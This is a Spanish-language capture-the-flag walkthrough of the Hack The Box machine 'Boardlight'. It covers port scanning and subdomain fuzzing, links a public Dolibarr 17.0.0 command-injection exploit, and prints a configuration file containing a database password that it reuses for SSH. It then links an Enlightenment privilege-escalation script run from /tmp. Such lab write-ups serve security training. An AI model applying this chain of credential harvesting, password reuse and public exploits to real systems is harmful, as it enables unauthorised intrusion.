---
title: Boardlight Writeup
author: l0n3
date: 2025-03-23
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy, Dolibarr 17.0.0 exploitation]
image: /assets/img/commons/Precious/Precious.png 
---

```bash
# Nmap 7.95 scan initiated Sun Mar 23 09:38:14 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -n -vvv -Pn -oG ports 10.10.11.11
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.11 ()    Status: Up
Host: 10.10.11.11 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Sun Mar 23 09:38:32 2025 -- 1 IP address (1 host up) scanned in 18.40 seconds
```

Puertos 22 y 80 abiertos. Por lo tanto realizo un nmap para ver las versiones que corren en estos. 

```bash
# Nmap 7.95 scan initiated Sun Mar 23 09:38:57 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN versions 10.10.11.11
Nmap scan report for 10.10.11.11
Host is up (0.32s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 23 09:39:20 2025 -- 1 IP address (1 host up) scanned in 23.24 seconds
```

Al realizar un directory listing solo me mostro los directorios, js, css e images. Nada importante, asique veo de hacer un crawling de los subdomains y este fue el resultado.

```bash
$ ffuf -u http://board.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.board.htb" -fl 518

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 518
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 228ms]
```

Vemos un crm ahi con status code 200.

![image](https://github.com/user-attachments/assets/40c054cd-9f50-41d1-bacb-2cacd0e1b10d)

Lo primero que llama la atencion es ver la version, por lo que podemos hacer una pequeña busqueda, y ver que es dolibarr y su latest version.

```bash
**Dolibarr ERP/CRM** es un software de [Planificación de Recursos Empresariales] (PRE, ERP en inglés)
```

Exploit en dolibarr 17.0.0 PHP cammand injection

```bash
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
```

![image](https://github.com/user-attachments/assets/3870ce3b-0b2f-4494-ac45-e95612f43a7c)

Tenemos que migrar al user larissa que vemos en el /etc/passwd para poder tener la primer flag.

si busco recursivamente en el directorio en el cual estoy situado por algun archivo conf para ver si hay credenciales, obtengo lo siguiente.
```bash
www-data@boardlight:~/html/crm.board.htb$ find . -name \*conf\* 2>/dev/null
```

```bash
./htdocs/public/project/suggestconference.php
./htdocs/theme/common/fontawesome-5/svgs/brands/confluence.svg
./htdocs/theme/common/fontawesome-5/js/conflict-detection.js
./htdocs/theme/common/fontawesome-5/js/conflict-detection.min.js
./htdocs/theme/md/ckeditor/config.js
./htdocs/theme/eldy/ckeditor/config.js
./htdocs/includes/ckeditor/ckeditor/bender-runner.config.json
./htdocs/includes/ckeditor/ckeditor/build-config.js
./htdocs/includes/ckeditor/ckeditor/config.js
./htdocs/includes/ckeditor/ckeditor/plugins/exportpdf/tests/manual/configfilename.html
./htdocs/includes/ckeditor/ckeditor/plugins/exportpdf/tests/manual/configfilename.md
./htdocs/includes/ckeditor/ckeditor/plugins/smiley/images/confused_smile.png
./htdocs/includes/ckeditor/ckeditor/plugins/smiley/images/confused_smile.gif
./htdocs/includes/tecnickcom/tcpdf/tcpdf_autoconfig.php
./htdocs/includes/tecnickcom/tcpdf/config
./htdocs/includes/tecnickcom/tcpdf/config/tcpdf_config.php
./htdocs/install/mysql/data/llx_holiday_config.sql
./htdocs/install/fileconf.php
./htdocs/admin/eventorganization_confbooth_extrafields.php
./htdocs/admin/eventorganization_confboothattendee_extrafields.php
./htdocs/conf
./htdocs/conf/conf.php.old
./htdocs/conf/conf.php.example
./htdocs/conf/conf.php
```

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
<?php
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
```

aca -> $dolibarr_main_db_pass='serverfun2$2023!!'; 
vemos esta contraseña la cual podemos ver si se esta reutilizando en el user larissa.

y asi era.

```bash
larissa@boardlight:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
```

-----------------------------

```bash
searchsploit enlightenment      

Exploit Title  

Enlightenment - Linux Null PTR Dereference Framework                   
Enlightenment v0.25.3 - Privilege escalation
```

y en la maquina vemos que correo la version XX

```bash
larissa@boardlight:~$ enlightenment --version
ESTART: 0.00000 [0.00000] - Begin Startup
ESTART: 0.00005 [0.00004] - Signal Trap
ESTART: 0.00006 [0.00001] - Signal Trap Done
ESTART: 0.00007 [0.00001] - Eina Init
ESTART: 0.00027 [0.00019] - Eina Init Done
ESTART: 0.00029 [0.00002] - Determine Prefix
ESTART: 0.00041 [0.00012] - Determine Prefix Done
ESTART: 0.00043 [0.00002] - Environment Variables
ESTART: 0.00044 [0.00001] - Environment Variables Done
ESTART: 0.00045 [0.00001] - Parse Arguments
Version: 0.23.1
```

por lo tanto tenemos una via de explotacion en la version de este binario para escalar privilegios.

```bash
https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/refs/heads/main/exploit.sh
```

En el directorio /tmp metemos el script, le damos permiso de ejecucion y lo ejecutamos.


![image](https://github.com/user-attachments/assets/210ed71c-12ea-4730-a12d-ad3929a8122d)

Por lo que ahora si ganamos la segunda y ultima flag para terminar la maquina.

